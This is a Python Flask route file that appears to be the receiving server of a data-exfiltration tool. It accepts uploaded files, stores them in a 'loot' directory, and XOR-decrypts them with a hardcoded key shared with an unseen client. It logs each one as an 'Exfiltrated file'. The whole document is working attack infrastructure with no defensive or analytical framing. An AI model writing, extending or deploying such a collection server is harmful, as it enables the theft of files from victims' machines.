# server/routes/upload.py
from flask import Blueprint, request
import os, base64
from datetime import datetime

upload_bp = Blueprint("upload", __name__)
LOOT_DIR = "loot"

# XOR decryption key (must match client)
XOR_KEY = b"SILENTMIND"

def xor_decrypt(data: bytearray, key: bytes):
    """Decrypt data using XOR with the given key"""
    k = len(key)
    for i in range(len(data)):
        data[i] ^= key[i % k]

def sanitize_filename(name: str) -> str:
    """
    Keep Unicode (e.g., Arabic) but block dangerous chars.
    Replace path separators and NULs; trim spaces.
    """
    for ch in ['/', '\\', '\x00', ':', '*', '?', '"', '<', '>', '|']:
        name = name.replace(ch, '_')
    name = name.strip()
    return name or "unknown.bin"

@upload_bp.route("/upload", methods=["POST"])
def upload_file():
    try:
        os.makedirs(LOOT_DIR, exist_ok=True)

        hdr_b64 = request.headers.get("X-Filename-B64")
        if hdr_b64:
            try:
                orig = base64.b64decode(hdr_b64).decode("utf-8", errors="replace")
            except Exception:
                orig = "unknown.bin"
        else:
            orig = request.headers.get("X-Filename", "unknown.bin")

        safe_name = sanitize_filename(orig)
        ts = datetime.utcnow().strftime("%Y%m%d-%H%M%S")
        out_path = os.path.join(LOOT_DIR, f"{ts}__{safe_name}")

        # STREAM the body to disk (encrypted)
        total = 0
        with open(out_path, "wb") as f:
            for chunk in iter(lambda: request.stream.read(64 * 1024), b""):
                f.write(chunk)
                total += len(chunk)

        print(f"[+] Exfiltrated file saved to {out_path} ({total} bytes)")

        # Decrypt the file and save as .recovered
        try:
            with open(out_path, "rb") as f:
                encrypted_data = bytearray(f.read())
            
            print(f"[DEBUG] Read {len(encrypted_data)} bytes for decryption")
            
            # Decrypt the data
            xor_decrypt(encrypted_data, XOR_KEY)
            
            # Save decrypted version
            root, ext = os.path.splitext(out_path)
            decrypted_path = root + ".recovered" + (ext if ext else "")
            
            with open(decrypted_path, "wb") as f:
                f.write(encrypted_data)
            
            print(f"[+] Decrypted file saved to {decrypted_path}")
        except Exception as decrypt_error:
            print(f"[!] Failed to decrypt file: {decrypt_error}")
            import traceback
            traceback.print_exc()

        return "OK", 200
    except Exception as e:
        import traceback
        print("[UPLOAD ERROR]", e)
        traceback.print_exc()
        return ("Bad upload", 400)
